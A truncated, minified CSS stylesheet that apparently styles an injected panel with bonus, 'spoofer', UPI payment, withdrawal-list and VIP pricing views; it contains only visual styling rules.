padding: 14px; border-radius: 12px; border: none; background: linear-gradient(90deg, #f5a623 0%, #f5c842 100%); color: #1a1200; font-size: 15px; font-weight: 800; cursor: pointer; font-family: inherit; letter-spacing: .1px }:host(.light) .wg-pop-cta { background: linear-gradient(90deg, #f95959 0%, #ff8c6e 100%); color: #fff }.wg-pop-cta:active { opacity: .9 }.wg-pop-footer { display: flex; align-items: center; gap: 7px; padding: 8px 16px 16px; justify-content: center }.wg-checkbox { width: 17px; height: 17px; border-radius: 50%; border: 1.5px solid #4a4d6a; display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0; transition: background .15s, border-color .15s }.wg-checkbox.checked { background: #07c160; border-color: #07c160 }.wg-check-tick { font-size: 10px; color: #fff; opacity: 0; transition: opacity .15s }.wg-checkbox.checked .wg-check-tick { opacity: 1 }.wg-no-remind { font-size: 11px; color: #4a4d6a; cursor: pointer }:host(.light) .wg-no-remind { color: #aaa }.bonus-view { position: fixed; top: 0; left: var(--bv-left, 0px); width: var(--bv-width, 100%); height: 100%; z-index: 9999; display: none; flex-direction: column; background: #1a1a2c; font-family: -apple-system, "system-ui", "Helvetica Neue", Helvetica, "Segoe UI", Arial, Roboto, sans-serif; color: #c8cad0 }:host(.light) .bonus-view { background: #f7f8ff; color: #333 }.bonus-hdr { display: flex; align-items: center; gap: 0; padding: 0 16px; height: 49px; background: #22224b; flex-shrink: 0 }:host(.light) .bonus-hdr { background: linear-gradient(90deg, #f95959 0%, #ff9a8e 100%) }.bonus-back-btn { background: none; border: none; padding: 0; margin-right: 8px; cursor: pointer; color: #fff; display: flex; align-items: center; justify-content: center; width: 32px; height: 32px }.bonus-back-btn svg { width: 20px; height: 20px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round }.bonus-ttl { font-size: 19px; font-weight: 400; color: #fff; flex: 1; text-align: center; margin-right: 32px }.bonus-scroll { flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch }.bonus-hero { padding: 24px 20px 16px; text-align: center }.bonus-hero-icon { font-size: 32px; margin-bottom: 6px }.bonus-h2 { font-size: 18px; font-weight: 700; color: #e8e9f0; margin: 0 0 5px; line-height: 1.2 }:host(.light) .bonus-h2 { color: #1a1a1a }.bonus-sub { font-size: 12px; color: #8b8ea0; line-height: 1.5; margin: 0 auto; max-width: 240px }:host(.light) .bonus-sub { color: #666 }.bonus-stats-row { display: flex; gap: 6px; padding: 0 14px; margin-bottom: 10px }.bonus-stat { flex: 1; text-align: center; background: #22224b; border: 1px solid #2d3060; border-radius: 10px; padding: 10px 4px }:host(.light) .bonus-stat { background: #fff; border-color: #e8e8e8 }.bonus-stat-val { display: block; font-size: 15px; font-weight: 700; color: #f5c842; letter-spacing: -.2px }:host(.light) .bonus-stat-val { color: #d97706 }.bonus-stat-lbl { display: block; font-size: 9px; font-weight: 600; color: #5a5d72; text-transform: uppercase; letter-spacing: .3px; margin-top: 2px }:host(.light) .bonus-stat-lbl { color: #999 }.bonus-prog-card { margin: 0 14px 10px; background: #22224b; border: 1px solid #2d3060; border-radius: 10px; padding: 11px 12px }:host(.light) .bonus-prog-card { background: #fff; border-color: #e8e8e8 }.bonus-prog-lbl { display: flex; justify-content: space-between; align-items: center; font-size: 10px; font-weight: 600; color: #5a5d72; text-transform: uppercase; letter-spacing: .3px; margin-bottom: 7px }:host(.light) .bonus-prog-lbl { color: #999 }.bonus-prog-count { color: #f5c842; font-weight: 700 }:host(.light) .bonus-prog-count { color: #d97706 }.bonus-bar { height: 6px; border-radius: 99px; background: #2d3060; overflow: hidden }:host(.light) .bonus-bar { background: #eee }.bonus-bar-fill { height: 100%; width: 0%; border-radius: 99px; background: #f5c842; transition: width .4s ease }:host(.light) .bonus-bar-fill { background: #f95959 }.bonus-section-ttl { font-size: 10px; font-weight: 700; color: #5a5d72; text-transform: uppercase; letter-spacing: .5px; margin-bottom: 8px }:host(.light) .bonus-section-ttl { color: #bbb }.bonus-tiers { padding: 0 14px; margin-bottom: 14px }.bonus-tier { display: flex; align-items: center; gap: 10px; padding: 10px 12px; background: #22224b; border: 1px solid #2d3060; border-radius: 10px; margin-bottom: 5px }:host(.light) .bonus-tier { background: #fff; border-color: #e8e8e8 }.tier-badge { width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; color: #fff; flex-shrink: 0; background: #3a3d6b }:host(.light) .tier-badge { background: #ccc }.t-bronze { background: #a0522d }.t-silver { background: #8a9bb5 }.t-gold { background: #d97706 }.t-diamond { background: #6d28d9 }.tier-info { flex: 1; font-size: 12px; color: #7b7e94; line-height: 1.5 }:host(.light) .tier-info { color: #666 }.tier-info b { color: #e8e9f0; font-weight: 700 }:host(.light) .tier-info b { color: #222 }.bonus-cta-btn { display: block; width: calc(100% - 28px); margin: 6px 14px 10px; padding: 13px; border-radius: 10px; border: none; background: #f5c842; color: #1a1a2c; font-size: 14px; font-weight: 700; cursor: pointer; font-family: inherit; transition: opacity .15s }:host(.light) .bonus-cta-btn { background: #f95959; color: #fff }.bonus-cta-btn:active { opacity: .85 }.bonus-link-preview { margin: 0 14px 14px; padding: 8px 10px; border-radius: 8px; background: #22224b; border: 1px solid #2d3060; font-size: 10px; color: #5a5d72; word-break: break-all; line-height: 1.5; font-family: monospace }:host(.light) .bonus-link-preview { background: #f5f5f5; border-color: #e8e8e8; color: #999 }.bonus-rules { padding: 0 14px; margin-bottom: 14px }.bonus-rule { font-size: 11px; color: #7b7e94; line-height: 1.7 }:host(.light) .bonus-rule { color: #666 }.settings-header-label { flex: 1; font-size: 13.5px; font-weight: 800; color: var(--t-title); letter-spacing: -.2px }.spoofer-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; padding: 14px 13px; margin-top: 2px }.spoofer-section { margin-bottom: 14px }.spoofer-section:last-of-type { margin-bottom: 12px }.spoofer-label { display: block; font-size: 9px; font-weight: 800; text-transform: uppercase; letter-spacing: .8px; color: var(--t-dim); margin-bottom: 8px }.spoofer-row { display: flex; align-items: center; gap: 8px }.spoofer-row input[type="range"] { flex: 1; height: 4px; -webkit-appearance: none; appearance: none; background: var(--strip); border-radius: 3px; outline: none; cursor: pointer }.spoofer-row input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; width: 14px; height: 14px; border-radius: 50%; background: var(--pro); border: 2px solid var(--panel-bg); cursor: pointer; box-shadow: 0 1px 6px rgba(139,92,246,.4) }.spoofer-row input[type="number"] { width: 52px; padding: 5px 6px; border-radius: 8px; border: 1px solid var(--card-bdr); background: var(--panel-bg); color: var(--t-title); font-size: 12px; font-weight: 700; font-family: var(--f); text-align: center; outline: none; -webkit-appearance: none; appearance: none; -moz-appearance: textfield }.spoofer-row input[type="number"]::-webkit-inner-spin-button, .spoofer-row input[type="number"]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0 }.spoofer-row input[type="number"]:focus { border-color: var(--pro) }.spoofer-unit { font-size: 11px; font-weight: 700; color: var(--t-dim); min-width: 14px }.spoofer-reset { display: block; width: 100%; padding: 8px; border-radius: 8px; border: 1px solid var(--card-bdr); background: transparent; color: var(--t-dim); font-size: 10.5px; font-weight: 600; cursor: pointer; font-family: var(--f); transition: all .15s; letter-spacing: .2px; -webkit-appearance: none; appearance: none }.spoofer-reset:hover { border-color: var(--pro); color: var(--pro) }.spoofer-reset:active { transform: scale(.97) }.pay-overlay { position: fixed; top: 0; left: var(--bv-left, 0px); width: var(--bv-width, 100%); height: 100vh; height: 100dvh; background: #1a1a2c; z-index: 99999; font-family: var(--f, system-ui, -apple-system, sans-serif); color: #c8cad0; display: flex; flex-direction: column; overflow: hidden; box-sizing: border-box; max-width: 100vw;}:host(.light) .pay-overlay { background: #fdfdfd; color: #1a1b25; }.pay-hdr { display: flex; align-items: center; justify-content: space-between; height: 56px; padding: 0 20px; flex-shrink: 0; background: #22224b; border-bottom: 1px solid rgba(255, 255, 255, 0.06); position: relative; z-index: 10;}:host(.light) .pay-hdr { background: #fff; border-bottom: 1px solid rgba(0, 0, 0, 0.04);}.pay-back { background: none; border: none; padding: 0; cursor: pointer; color: #fff; width: 32px; height: 32px; display: flex; align-items: center; justify-content: flex-start; transition: transform 0.2s ease, opacity 0.2s ease;}.pay-back:active { transform: translateX(-2px); opacity: 0.7; }:host(.light) .pay-back { color: #1a1b25; }.pay-back svg { width: 22px; height: 22px; stroke-width: 2.5; }.pay-ttl { font-size: 16px; font-weight: 700; color: #fff; letter-spacing: 0; }:host(.light) .pay-ttl { color: #111; }.pay-body { flex: 1; overflow-y: auto; overflow-x: hidden; -webkit-overflow-scrolling: touch; padding-bottom: 34px; }.pay-content { padding-top: 0; }@keyframes slideUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }.pay-anim { animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) backwards; }.pay-anim-1 { animation-delay: 0.05s; }.pay-anim-2 { animation-delay: 0.1s; }.pay-anim-3 { animation-delay: 0.15s; }.pay-anim-4 { animation-delay: 0.2s; }.pay-hero { position: relative; min-height: 148px; padding: 22px 20px 34px; overflow: hidden; background: linear-gradient(90deg, #fb8466 0%, #bd5bd4 33%, #7473fa 66%, #53b2fa 100%);}:host(.light) .pay-hero { background: linear-gradient(90deg, #ff6b6b 0%, #ff9b9b 52%, #fff2f2 100%); }.pay-hero::after { content: \'\'; position: absolute; inset: auto 0 0; height: 46px; background: linear-gradient(to bottom, rgba(26,26,44,0), #1a1a2c 82%);}:host(.light) .pay-hero::after { background: linear-gradient(to bottom, rgba(253,253,253,0), #fdfdfd 82%); }.pay-hero-top { position: relative; z-index: 1; display: flex; align-items: flex-start; justify-content: space-between; gap: 14px; }.pay-hero-label { display: block; color: rgba(255,255,255,.72); font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: .5px; margin-bottom: 7px; }.pay-hero-sub { position: relative; z-index: 1; margin-top: 10px; color: rgba(255,255,255,.82); font-size: 13px; font-weight: 600; }.pay-amount-box { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 32px 20px 24px; position: relative; }.pay-amount-bg { position: absolute; top: -70px; right: -40px; width: 210px; height: 150px; background: rgba(255,255,255,.26); filter: blur(48px); opacity: .6; border-radius: 50%; z-index: 0;}:host(.light) .pay-amount-bg { background: linear-gradient(90deg, #f95959, #ff8080); filter: blur(50px); opacity: 0.1; }.pay-timer-pill { display: flex; align-items: center; gap: 6px; position: relative; z-index: 1; background: rgba(34, 34, 75, 0.28); border: 1px solid rgba(255, 255, 255, 0.25); padding: 7px 12px; border-radius: 20px; flex-shrink: 0; box-shadow: inset 0 1px 0 rgba(255,255,255,.16);}:host(.light) .pay-timer-pill { background: #fff; border-color: rgba(0,0,0,0.05); box-shadow: 0 4px 12px rgba(0,0,0,0.03); }.pay-timer-pill.urgent { background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.2); animation: timerShake 0.45s ease infinite; }.pay-clock { width: 14px; height: 14px; color: #fff; flex-shrink: 0; }:host(.light) .pay-clock { color: #f95959; }.pay-timer-pill.urgent .pay-clock { color: #ef4444; }.pay-timer-txt { font-weight: 800; color: #fff; font-size: 14px; font-variant-numeric: tabular-nums; letter-spacing: 0.5px; }:host(.light) .pay-timer-txt { color: #f95959; }.pay-timer-pill.urgent .pay-timer-txt { color: #ef4444; }.pay-amt { display: block; position: relative; z-index: 1; font-size: 44px; font-weight: 900; color: #fff; letter-spacing: 0; line-height: .98; text-shadow: 0 8px 24px rgba(0,0,0,0.22); }:host(.light) .pay-amt { color: #fff; text-shadow: 0 8px 22px rgba(249, 89, 89, 0.18); }.pay-section { padding: 0 20px; margin-bottom: 16px; }.pay-section-hdr { font-size: 12px; font-weight: 800; color: #8b8ea0; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }:host(.light) .pay-section-hdr { color: #888; }.pay-qr-card { margin-top: -24px; position: relative; z-index: 2; }.pay-method-card, .pay-form-card { position: relative; z-index: 1; }.pay-qr-wrapper { background: #22224b; border-radius: 22px; padding: 18px 18px 16px; display: flex; flex-direction: column; align-items: center; border: 1px solid rgba(255, 255, 255, 0.07); box-shadow: 0 14px 34px rgba(0,0,0,0.24), inset 0 1px 0 rgba(255, 255, 255, 0.04);}:host(.light) .pay-qr-wrapper { background: #fff; border-color: rgba(0,0,0,0.04); box-shadow: 0 8px 30px rgba(0,0,0,0.04); }.pay-qr-box { background: #fff; border-radius: 18px; padding: 10px; margin-bottom: 12px; box-shadow: 0 7px 24px rgba(0,0,0,0.16), 0 0 0 1px rgba(0,0,0,0.05); position: relative; }.pay-qr { width: 172px; height: 172px; display: block; border-radius: 10px; opacity: 0; transition: opacity 0.4s ease; position: relative; z-index: 2; }.pay-qr.loaded { opacity: 1; }.pay-qr-skeleton { position: absolute; inset: 10px; border-radius: 10px; background: rgba(0,0,0,0.03); display: flex; align-items: center; justify-content: center; z-index: 1; }.pay-qr-skeleton svg { width: 28px; height: 28px; animation: paySpin 1s linear infinite; color: #8b8ea0; }@keyframes paySpin { 100% { transform: rotate(360deg); } }.pay-scan-text { font-size: 13px; color: #b8bbcf; font-weight: 700; text-align: center; line-height: 1.5; }:host(.light) .pay-scan-text { color: #666; }.pay-upi-row { display: flex; align-items: center; gap: 12px; background: #22224b; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; padding: 13px 14px; transition: background 0.2s, border-color 0.2s; box-shadow: inset 0 1px 0 rgba(255,255,255,.03);}.pay-upi-row:active { background: rgba(255, 255, 255, 0.05); }:host(.light) .pay-upi-row { background: #fafafa; border-color: rgba(0,0,0,0.06); }:host(.light) .pay-upi-row:active { background: #f5f5f5; border-color: #f95959; }.pay-upi-info { flex: 1; display: flex; flex-direction: column; gap: 3px; min-width: 0; }.pay-upi-lbl { font-size: 11px; color: #8b8ea0; font-weight: 800; text-transform: uppercase; letter-spacing: 0.4px; }:host(.light) .pay-upi-lbl { color: #999; }.pay-upi-id { font-size: 16px; font-weight: 800; color: #fff; letter-spacing: 0; font-family: var(--f, system-ui, -apple-system, sans-serif); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }:host(.light) .pay-upi-id { color: #111; }.pay-upi-actions { display: flex; gap: 8px; align-items: center; }.pay-copy-btn { background: rgba(160, 143, 255, 0.16); color: #fff; border: 1px solid rgba(160,143,255,.18); padding: 9px 15px; border-radius: 12px; font-size: 12px; font-weight: 800; cursor: pointer; transition: all 0.2s ease;}:host(.light) .pay-copy-btn { background: rgba(249, 89, 89, 0.08); color: #f95959; }.pay-copy-btn:hover { background: rgba(160, 143, 255, 0.22); }.pay-copy-btn:active { transform: scale(0.95); }.pay-copy-btn.copied { background: #22c55e !important; color: #fff !important; }.pay-route-card { width: 100%; margin-top: 10px; padding: 11px 12px; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; background: #22224b; color: #fff; display: flex; align-items: center; gap: 11px; position: relative; overflow: hidden; cursor: pointer; text-align: left; box-shadow: inset 3px 0 0 #a08fff, inset 0 1px 0 rgba(255,255,255,.04); font-family: var(--f, system-ui, -apple-system, sans-serif); transition: transform .18s ease, border-color .18s ease, background .18s ease;}.pay-route-card:active { transform: scale(.985); border-color: rgba(160,143,255,.38); background: #292958; }.pay-route-index { flex: 0 0 auto; min-width: 48px; padding: 8px 9px; border-radius: 12px; text-align: center; color: #fff; font-size: 12px; font-weight: 900; background: linear-gradient(90deg, #fb8466, #bd5bd4, #7473fa, #53b2fa); box-shadow: inset 0 1px 0 rgba(255,255,255,.18);}.pay-route-copy { position: relative; z-index: 1; flex: 1; display: flex; flex-direction: column; gap: 2px; min-width: 0; }.pay-route-title { font-size: 12.5px; font-weight: 800; color: #fff; letter-spacing: 0; line-height: 1.2; }.pay-route-sub { font-size: 11px; font-weight: 600; color: #b9bdd6; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }.pay-route-icon { position: relative; z-index: 1; width: 32px; height: 32px; flex: 0 0 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; background: rgba(160,143,255,.16);}.pay-route-icon svg { width: 19px; height: 19px; }.pay-route-note { margin-top: 10px; color: #8b8ea0; font-size: 12px; font-weight: 600; text-align: center; }:host(.light) .pay-route-card { background: #fafafa; border-color: rgba(0,0,0,.06); color: #111; box-shadow: inset 3px 0 0 #f95959; }:host(.light) .pay-route-index { background: linear-gradient(90deg, #f95959, #ff8080); }:host(.light) .pay-route-title { color: #111; }:host(.light) .pay-route-sub, :host(.light) .pay-route-note { color: #777; }:host(.light) .pay-route-icon { background: rgba(249,89,89,.08); color: #f95959; }.pay-field-wrapper { background: #22224b; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; display: flex; align-items: center; padding: 6px 6px 6px 16px; transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: inset 0 1px 0 rgba(255,255,255,.03);}.pay-field-wrapper:focus-within { border-color: #bd5bd4; box-shadow: 0 0 0 3px rgba(189, 91, 212, 0.15), 0 4px 12px rgba(0,0,0,0.2); }:host(.light) .pay-field-wrapper { background: #fafafa; border-color: rgba(0,0,0,0.08); box-shadow: 0 2px 12px rgba(0,0,0,0.02); }:host(.light) .pay-field-wrapper:focus-within { border-color: #f95959; box-shadow: 0 0 0 3px rgba(249, 89, 89, 0.1); }.pay-utr-input { flex: 1; background: transparent; border: none; outline: none; font-size: 15px; font-weight: 500; color: #fff; font-family: var(--f); padding: 10px 0; letter-spacing: 1px;}.pay-utr-input::placeholder { color: #5a5d72; font-weight: 400; letter-spacing: normal; }:host(.light) .pay-utr-input { color: #111; }:host(.light) .pay-utr-input::placeholder { color: #999; }.pay-paste-pill { background: rgba(255, 255, 255, 0.08); color: #fff; border: none; border-radius: 12px; padding: 9px 14px; font-size: 12px; font-weight: 800; cursor: pointer; transition: all 0.2s;}.pay-paste-pill:active { background: rgba(255, 255, 255, 0.1); transform: scale(0.95); }:host(.light) .pay-paste-pill { background: rgba(0,0,0,0.04); color: #111; }:host(.light) .pay-paste-pill:active { background: rgba(0,0,0,0.08); }.pay-utr-warn { display: flex; align-items: flex-start; gap: 6px; margin-top: 10px; padding: 0 4px; }.pay-utr-warn svg { width: 14px; height: 14px; color: #ef4444; flex-shrink: 0; margin-top: 1px; }.pay-utr-warn-txt { font-size: 11px; color: #ef4444; opacity: 0.9; line-height: 1.4; font-weight: 500; }.pay-submit-btn { width: 100%; padding: 16px; border-radius: 999px; border: none; background: linear-gradient(90deg, #fb8466, #bd5bd4, #7473fa, #53b2fa); background-size: 200% 200%; color: #fff; font-size: 16px; font-weight: 700; font-family: var(--f); cursor: pointer; position: relative; overflow: hidden; box-shadow: 0 10px 22px rgba(116, 115, 250, 0.28), inset 0 1px 0 rgba(255,255,255,0.22); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);}.pay-submit-btn:active:not(.disabled) { transform: translateY(2px) scale(0.98); box-shadow: 0 2px 10px rgba(116, 115, 250, 0.2), inset 0 1px 0 rgba(255,255,255,0.1); }.pay-submit-btn.disabled { background: #2a2a35 !important; color: #5a5d72 !important; box-shadow: none !important; cursor: not-allowed; }:host(.light) .pay-submit-btn { background: linear-gradient(90deg, #f95959, #ff8080); box-shadow: 0 6px 20px rgba(249, 89, 89, 0.3), inset 0 1px 0 rgba(255,255,255,0.3); }:host(.light) .pay-submit-btn.disabled { background: #e8e8e8 !important; color: #999 !important; }.pay-order-meta { display: flex; align-items: center; justify-content: space-between; padding: 12px 20px 0; margin-top: 4px; position: relative;}.pay-order-meta::before { content: \'\'; position: absolute; top: 0; left: 20px; right: 20px; height: 1px; background: rgba(255, 255, 255, 0.05); }:host(.light) .pay-order-meta::before { background: rgba(0, 0, 0, 0.05); }.pay-order-lbl { font-size: 12px; color: #5a5d72; font-weight: 500; }.pay-order-val { font-size: 13px; color: #8b8ea0; font-family: monospace; letter-spacing: 0.5px; }.pay-confirm-mask { position: fixed; inset: 0; z-index: 100000; display: flex; align-items: center; justify-content: center; padding: 20px; opacity: 0; pointer-events: none; transition: opacity 0.3s ease;}.pay-confirm-mask::before { content: \'\'; position: absolute; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); }.pay-confirm-mask.active { opacity: 1; pointer-events: auto; }.pay-confirm-box { position: relative; z-index: 1; width: 100%; max-width: 310px; background: #22224b; border: 1px solid rgba(255,255,255,0.08); border-radius: 20px; padding: 28px 24px 24px; text-align: center; transform: scale(0.95) translateY(10px); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: 0 20px 40px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.05);}.pay-confirm-mask.active .pay-confirm-box { transform: scale(1) translateY(0); }:host(.light) .pay-confirm-box { background: #fff; border-color: rgba(0,0,0,0.05); box-shadow: 0 20px 40px rgba(0,0,0,0.1); }.pay-conf-icon { width: 48px; height: 48px; margin: 0 auto 16px; color: #c4b5fd; background: rgba(196, 181, 253, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; }.pay-conf-icon svg { width: 24px; height: 24px; }:host(.light) .pay-conf-icon { color: #f95959; background: rgba(249, 89, 89, 0.08); }.pay-conf-ttl { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 8px; letter-spacing: -0.3px; }:host(.light) .pay-conf-ttl { color: #111; }.pay-conf-msg { font-size: 13.5px; color: #8b8ea0; line-height: 1.5; margin-bottom: 28px; }.pay-conf-msg b { color: #fff; font-weight: 600; }:host(.light) .pay-conf-msg { color: #666; }:host(.light) .pay-conf-msg b { color: #f95959; }.pay-conf-acts { display: flex; gap: 12px; }.pay-conf-btn { flex: 1; padding: 12px; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; border: none; font-family: var(--f); outline: none; }.pay-conf-btn.no { background: rgba(255,255,255,0.05); color: #c8cad0; }:host(.light) .pay-conf-btn.no { background: rgba(0,0,0,0.04); color: #666; }.pay-conf-btn.no:active { background: rgba(255,255,255,0.1); }.pay-conf-btn.yes { background: linear-gradient(90deg, #fb8466, #bd5bd4); color: #fff; box-shadow: 0 4px 12px rgba(189, 91, 212, 0.3); }:host(.light) .pay-conf-btn.yes { background: linear-gradient(90deg, #f95959, #ff8080); box-shadow: 0 4px 12px rgba(249, 89, 89, 0.3); }.pay-conf-btn.yes:active { transform: scale(0.96); box-shadow: 0 2px 8px rgba(189, 91, 212, 0.2); }#spoof-withdrawals-list { display: flex; flex-direction: column; gap: 8px; margin-top: 8px; max-height: 250px; overflow-y: auto; }.w-item { display: flex; flex-direction: column; gap: 8px; padding: 10px; border-radius: 10px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); }:host(.light) .w-item { background: #fafafa; border-color: rgba(0,0,0,0.06); }.w-info { display: grid; grid-template-columns: 1fr auto; gap: 4px; font-size: 11px; }.w-id { font-weight: 600; color: var(--t-title); grid-column: 1; }.w-amt { font-weight: 800; color: #fb8466; text-align: right; grid-column: 2; }:host(.light) .w-amt { color: #f95959; }.w-time { color: var(--t-dim); font-size: 9.5px; }.w-state { font-weight: 700; text-align: right; font-size: 10px; }.status-processing { color: #f5a623; }.status-success { color: #16a34a; }.status-failed { color: #ef4444; }.status-other { color: #8b8ea0; }.w-actions { display: flex; gap: 6px; }.w-actions button { flex: 1; padding: 6px; border: none; border-radius: 6px; font-size: 10px; font-weight: 700; cursor: pointer; transition: all .15s; font-family: var(--f); }.w-actions button:active { transform: scale(.96); }.btn-approve { background: rgba(22, 163, 74, 0.15); color: #22c55e; border: 1px solid rgba(22, 163, 74, 0.3); }.btn-approve:hover { background: rgba(22, 163, 74, 0.25); }.btn-reject { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }.btn-reject:hover { background: rgba(239, 68, 68, 0.25); }/* ── VIP Pricing ── */.view-vip.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 1) both; }@keyframes vipFadeIn { from { opacity: 0; transform: translateY(3px); } to { opacity: 1; transform: translateY(0); } }.vip-pricing-shell { display: flex; flex-direction: column; }.vip-offer-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.vip-offer-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--vip) 32%, transparent), transparent); pointer-events: none;}.vip-balls-track { display: flex; justify-content: center; align-items: center; padding: 11px 8px 9px;}.vip-ball { width: 22px; height: 22px; border-radius: 50%; flex-shrink: 0; display: block; box-shadow: 0 1px 4px rgba(0, 0, 0, .18);}:host(.light) .vip-ball { box-shadow: 0 1px 3px rgba(0, 0, 0, .1); }.vip-ball + .vip-ball { margin-left: -5px; }.vip-perks { display: flex; flex-direction: column; gap: 2px; padding: 6px 10px; border-top: 1px solid var(--strip);}.vip-perk-item { display: flex; align-items: center; gap: 10px; padding: 7px 8px; border-radius: 8px; background: transparent; cursor: pointer; transition: background 0.16s var(--ease), transform 0.16s var(--ease); user-select: none;}.vip-perk-item:hover { background: var(--strip); transform: translateX(2px);}.vip-perk-item:active { transform: scale(0.985) translateX(2px);}.vip-perk-mark { width: 12px; height: 12px; flex-shrink: 0; stroke: var(--vip); stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; fill: none; transition: transform 0.2s var(--ease);}.vip-perk-item:hover .vip-perk-mark { transform: scale(1.15);}.vip-perk-content { flex: 1; min-width: 0; display: flex; flex-direction: column; gap: 1px;}.vip-perk-title { font-size: 11px; font-family: var(--f); font-weight: 600; color: var(--t-title); letter-spacing: -0.15px; line-height: 1.3;}.vip-perk-desc { font-size: 8.5px; font-family: var(--f); font-weight: 400; color: var(--t-body); letter-spacing: 0.05px; opacity: 0.85;}.vip-perk-arrow { width: 12px; height: 12px; stroke: var(--t-dim); stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; fill: none; opacity: 0; transform: translateX(-4px); transition: opacity 0.16s var(--ease), transform 0.16s var(--ease), stroke 0.16s var(--ease);}.vip-perk-item:hover .vip-perk-arrow { opacity: 0.7; transform: translateX(0);}.vip-perk-item:hover .vip-perk-arrow:hover { stroke: var(--vip);}.vip-offer-foot { padding: 9px 13px 12px; border-top: 1px solid var(--strip);}.vip-price-line { display: flex; align-items: baseline; justify-content: center; gap: 3px; margin-bottom: 2px;}.vip-price-amt { font-size: 21px; font-weight: 800; color: var(--t-title); letter-spacing: -.5px; font-variant-numeric: tabular-nums; line-height: 1;}.vip-price-unit { font-size: 10.5px; font-weight: 500; color: var(--t-dim);}.vip-price-meta { margin: 0 0 9px; text-align: center; font-size: 9.5px; color: var(--t-dim); letter-spacing: .05px;}.vip-checkout-btn { width: 100%; padding: 11px; border-radius: 11px; border: none; background: var(--pro); color: #fff; font-size: 12.5px; font-weight: 700; letter-spacing: -.1px; cursor: pointer; font-family: var(--f); box-shadow: 0 2px 12px color-mix(in srgb, var(--pro) 30%, transparent); transition: transform .15s cubic-bezier(.16, 1, .3, 1), box-shadow .15s cubic-bezier(.16, 1, .3, 1); position: relative; overflow: hidden;}.vip-checkout-btn::after { content: \'\'; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255, 255, 255, .1), transparent 52%); pointer-events: none;}.vip-checkout-btn:hover { box-shadow: 0 4px 16px color-mix(in srgb, var(--pro) 40%, transparent);}.vip-checkout-btn:active { transform: scale(.98); transition-duration: .06s;}/* ── VIP Select Payment ── */.view-vip-pay.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 1) both; }.vip-hist-btn { width: 32px; height: 32px; border-radius: 10px; flex-shrink: 0; margin-left: auto; display: flex; align-items: center; justify-content: center; border: 1px solid var(--back-bdr); background: var(--back-bg); color: var(--back-col); cursor: pointer; padding: 0; transition: color .15s, border-color .15s, background .15s;}.vip-hist-btn svg { width: 14px; height: 14px; }.vip-hist-btn:hover { color: var(--back-col-h); border-color: var(--back-bdr-h); background: var(--pro-lt); }.vip-hist-btn:active { transform: scale(.97); transition-duration: .06s; }.vip-pay-shell { display: flex; flex-direction: column; }.vip-pay-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.vip-pay-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--pro) 28%, transparent), transparent); pointer-events: none;}.vip-pay-summary { display: flex; align-items: center; justify-content: space-between; padding: 10px 13px; border-bottom: 1px solid var(--strip);}.vip-pay-summary-lbl { font-size: 10px; font-weight: 500; color: var(--t-dim); letter-spacing: -.05px;}.vip-pay-summary-amt { font-size: 14px; font-weight: 800; color: var(--t-title); letter-spacing: -.4px; font-variant-numeric: tabular-nums;}.vip-pay-options { display: flex; flex-direction: column; }.vip-pay-opt { display: flex; align-items: center; gap: 10px; width: 100%; padding: 10px 11px; border: none; background: transparent; cursor: pointer; text-align: left; font-family: var(--f); transition: background .16s var(--ease), transform .16s var(--ease);}.vip-pay-opt + .vip-pay-opt { border-top: 1px solid var(--strip); }.vip-pay-opt:hover { background: var(--strip); }.vip-pay-opt:active { transform: scale(.99); transition-duration: .06s; }.vip-pay-opt-icon { width: 34px; height: 34px; border-radius: 10px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; transition: transform .18s var(--ease);}.vip-pay-opt-icon svg { width: 17px; height: 17px; fill: currentColor; }.vip-pay-upi .vip-pay-opt-icon { background: var(--upi-lt); color: var(--upi); }.vip-pay-crypto .vip-pay-opt-icon { background: var(--crypto-lt); color: var(--crypto); }.vip-pay-opt:hover .vip-pay-opt-icon { transform: scale(1.06); }.vip-pay-opt-body { flex: 1; min-width: 0; }.vip-pay-opt-top { 